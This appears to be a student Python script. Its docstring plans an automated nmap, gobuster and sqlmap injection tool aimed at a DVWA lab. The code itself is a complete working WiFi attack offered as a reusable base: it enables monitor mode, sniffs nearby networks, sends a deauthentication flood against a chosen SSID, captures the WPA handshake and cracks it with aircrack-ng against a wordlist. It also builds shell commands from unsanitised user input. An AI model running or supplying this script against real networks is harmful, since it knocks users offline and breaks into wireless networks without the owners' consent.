#!/usr/bin/env python

'''
The purpose of our tool is to automate web application reconnaissance and SQL Injection. 
This tool will test if any hidden paths of the web application is vulnerable to SQL injection.
 Our proposed tool would 
 1) ping the desired network range for live hosts, 
 2) scan for ports 80, 443 for web servers, 
 3) use Dirbuster to show any hidden files and directories, 
 4) try to perform SQLMap on those hidden web pages if they contain forms or any kind of user input. 


1.) Sqler [range]
    - Nmap the range and scan for ports 80, 443
    - Return a list of webservers
    - Ask which one you want to proceed
    - Input: “dvwa.com ip address”
    https://medium.com/@TheShredder/create-your-ethical-hacking-environment-install-dvwa-into-your-kali-linux-4783282dea6a
    https://www.yeahhub.com/install-dvwa-kali-linux/
2.) Use gobuster
    - Get the data back somehow?????
    - Run gobuster -o <file> – specify a file name to write the output to.
3.) Perform sqlmap on those paths in that output file from step 2
    - Login page
            -Use sqlmap on forms
    - Id parameter inside the url

CODE BELOW IS AN EXAMPLE OF A PAST PROJECT TO GIVE US STRUCTURE FOR UTILIZING
COMMAND LINE. 
'''

import os
import subprocess
from time import sleep

#Varaible Hard-Coded Values
number_deauth_packets = 20

if os.geteuid() != 0:
    print("\nHey noob, you need to run this script as root. #thx\n")
    exit(0)

def network_setup(int_name):
    try:
        os.system("airmon-ng check kill")
        os.system("/etc/init.d/avahi-daemon stop")
        os.system("ifconfig %s down" %int_name)
        os.system("airmon-ng start %s" %int_name)
        cmd = "ifconfig | grep mon | awk -F ':' '{print $1}' | awk '{print $1}'"
        int_name = str(os.popen(cmd).read()).strip('\n')
        return int_name
    except KeyboardInterrupt:
        print ("network_setup failed, please run script again")

def network_teardown(int_name):
    try:
        os.system("airmon-ng stop %s" %int_name)
        os.system("service network-manager restart")
    except NameError:
        print("Network Interface \"%s\" does not exist" %int_name)

def network_sniff(interface_name):
    try:
        os.system("airodump-ng -a -w testcap %s" %interface_name)
    except KeyboardInterrupt:
        print ("Network Sniffing Ended")

def deauth_bomb(int_name, number_deauth_packets):
    try:
        ssid_name = str(raw_input("What are the first 3 letters of the ssid you want to target? (Case Sensitive) "))

        cmd = "cat testcap-01.csv | grep " + ssid_name + " | awk '{print $1}' | awk -F',' 'NR==1{print $1}'"
        bssid = str(os.popen(cmd).read()).strip('\n')

        cmd = "cat testcap-01.csv | grep " + bssid + " | awk '{print $6}' | awk -F',' 'NR==1{print $1}'"
        channel = str(os.popen(cmd).read()).split('\n')[0]

        cmd = "iwconfig " + int_name + " channel " + channel
        os.system(cmd)

        cmd = "aireplay-ng -0 " + str(number_deauth_packets) + " -a " + bssid + " " + int_name
        subprocess.call(cmd, shell=True)
        return bssid, channel

    except KeyboardInterrupt:
        return bssid

def capture_handshake(bssid, int_name, channel):
    try:
        os.system("airodump-ng --bssid %s --channel %s -w captured_packet %s" %(bssid, channel, int_name))
    except KeyboardInterrupt:
        print ("nothing")


def display_ascii_bomb():
	print("\n                 _.-^^---....,,--\n             _--                  --_\n            <                        >)\n            |                         |\n             \._                   _./\n                ```--. . , ; .--'''\n                      | |   |\n                   .-=||  | |=-.\n                   `-=#$%&%$#=-'\n                      | ;  :|\n             _____.,-#%&$@%#&#~,._____\n\n")

def display_ascii_logo():
    print("                      (                                         \n (  (                 )\ )            (                      )  \n )\))(   ' (         (()/(   (      ( )\            )     ( /(  \n((_)()\ )  )\   ___   /(_))  )\     )((_)   (      (      )\()) \n_(())\_)()((_) |___| (_))_| ((_)   ((_)_    )\     )\  ' ((_)\  \n\ \((_)/ / (_)       | |_    (_)    | _ )  ((_)  _((_))  | |(_) \n \ \/\/ /  | |       | __|   | |    | _ \ / _ \ | '  \() | '_ \ \n  \_/\_/   |_|       |_|     |_|    |___/ \___/ |_|_|_|  |_.__/ \n")


if __name__ == "__main__":

    os.system("rm testcap*")
    os.system("rm captured*")
    display_ascii_logo()
    display_ascii_bomb()
    os.system("iwconfig")

    interface_name = raw_input("What is the name of your wireless interface? ")

    print ("\nSetting up Nic Parameters")
    int_name = network_setup(interface_name)

    print ("\nsniffing network, press CTRL+C when you see a network you want to target")
    network_sniff(int_name)

    print ("\nWith user input, sending De-Auth bomb")
    bssid, channel = deauth_bomb(int_name, number_deauth_packets)

    print ("Capturing 4-way handshake, targeting " + str(bssid))
    capture_handshake(bssid, int_name, channel)

    print("\nResetting Nic Parameters and restarting Network-Manager.\n")
    network_teardown(int_name)

    cmd = "aircrack-ng -w /usr/share/john/password.lst -b " + bssid + " captured_packet-01.cap"
    subprocess.call(cmd, shell=True)

